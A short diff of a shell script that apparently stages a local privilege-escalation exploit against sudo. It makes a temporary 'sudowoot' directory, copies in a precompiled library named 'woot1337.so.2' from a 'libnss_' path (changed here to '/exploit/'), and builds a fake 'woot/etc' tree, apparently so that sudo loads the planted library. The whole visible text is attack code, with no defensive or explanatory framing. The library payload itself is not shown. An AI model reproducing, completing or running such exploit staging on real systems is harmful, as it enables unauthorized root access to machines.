@@ -6,7 +6,7 @@ STAGE=$(mktemp -d /tmp/sudowoot.XXXXXX)
 cd "${STAGE}" || exit 1
 
 # Copy pre-compiled library
-cp /path/to/libnss_/woot1337.so.2 ./
+cp /exploit/woot1337.so.2 ./
 
 # Create necessary directory structure
 mkdir -p woot/etc
